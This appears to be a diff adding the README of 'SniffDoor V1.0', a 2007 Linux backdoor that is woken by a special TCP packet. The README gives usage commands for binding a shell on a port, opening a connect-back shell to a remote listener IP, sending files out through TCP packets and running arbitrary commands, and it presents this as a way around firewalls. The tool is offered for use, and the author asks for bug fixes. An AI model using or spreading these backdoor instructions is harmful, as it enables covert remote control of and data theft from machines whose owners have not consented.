@@ -1,0 +1,79 @@
+
+ SniffDoor V 1.0 (c)  2007   by wzt   <wzt@xsec.org>
+ +--------------------------------------------------+
+
+ Sniffdoor is a linux backdoor woke up with a special
+ tcp packet.It can bind a shell with tty,it can send
+ files with tcp packet,that's means the server side
+ can sniff your files in the special tcp packets,
+ and save on its server.The client can send a shell
+ command with the packet,the server sniff and execute
+ it,so it can round the firewall.
+
+ +--------------------------------------------------+
+ [USAGE]:
+ 
+ server:
+ 
+ $make;
+ ./sniffdoor
+ 
+ client:
+ $make;
+ ./sniffclient
+
+ sniffdoor <options> [remote_ip] [port] [command]
+
+ <options>:
+ -packet <remote_ip> [port] <command>
+ -connect <remote ip> <port>
+ -listen  <port>
+
+ <command>:
+ bind:<port>
+ back:<remote_ip> <port>
+ file:<filename>
+ comm:<command>
+ 
+ 1. bindshell:
+    send tcp packet to host 61.155.217.56,and then it
+    bind a shell on port 999
+   ./client -packet 61.155.217.56 bind:999
+   ./client -packet 61.155.217.56 22 bind:999
+   port 22 is a active port on the host.
+
+ 2.connect back door:
+    1).you server must listen a port first(your ip
+       is 123.45.64.57):
+    ./client -listen 999
+
+    2).send tcp packet to host 61.155.217.56,and then
+    bind a shell to remote 123.45.64.57 on port 999
+    ./client -packet 61.155.217.56 back:123.45.64.57:999
+    ./client -packet 61.155.217.56 21 back:123.45.64.57:999
+    
+ 3.send file:
+    1).send file with tcp packet.
+    ./client -packet 61.155.217.56 file:bind.c
+    ./client -packet 61.155.217.56 80 file:bind.c
+    
+    NOTE!
+    It can only send txt files , not binary files.
+    If you fixed up this bug,mail to me,thx.
+ 
+ 4.execute command:
+    1).execute command with tcp packet.
+    ./client -packet 61.155.217.56 comm:"gcc -o bind bind.c"
+    ./client -packet 61.155.217.56 23 comm:"gcc -o bind bind.c"
+    
+ +-----------------------------------------------------+
+
+ [THANKS]:
+ 
+ Thank baozi for testing the door all the time.
+ 
+ [END]:
+ 
+ send any bug to <wzt@xsec.org>.
+ 
+-wzt
